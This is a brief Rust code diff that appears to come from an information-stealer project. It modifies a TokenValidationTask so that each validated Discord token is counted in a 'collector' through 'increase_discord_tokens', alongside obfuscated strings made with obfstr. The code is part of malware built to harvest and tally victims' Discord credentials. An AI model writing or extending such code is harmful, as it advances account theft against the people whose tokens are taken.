@@ -4,6 +4,7 @@ use alloc::string::{String, ToString};
 use alloc::sync::Arc;
 use alloc::vec::Vec;
 use collector::atomic::AtomicCollector;
+use collector::{Collector, Software};
 use core::fmt::{Display, Formatter};
 use obfstr::obfstr as s;
 use requests::{Request, RequestBuilder, ResponseBodyExt};
@@ -18,11 +19,12 @@ struct TokenValidationTask {
 }
 
 impl Task for TokenValidationTask {
-    // TODO: Impl collector
-    unsafe fn run(&self, parent: &Path, _: &AtomicCollector) {
+    unsafe fn run(&self, parent: &Path, collector: &AtomicCollector) {
         let Some(info) = get_token_info(self.token.clone()) else {
             return
         };
+
+        collector.software().increase_discord_tokens();
 
         let _ = info
             .to_string()
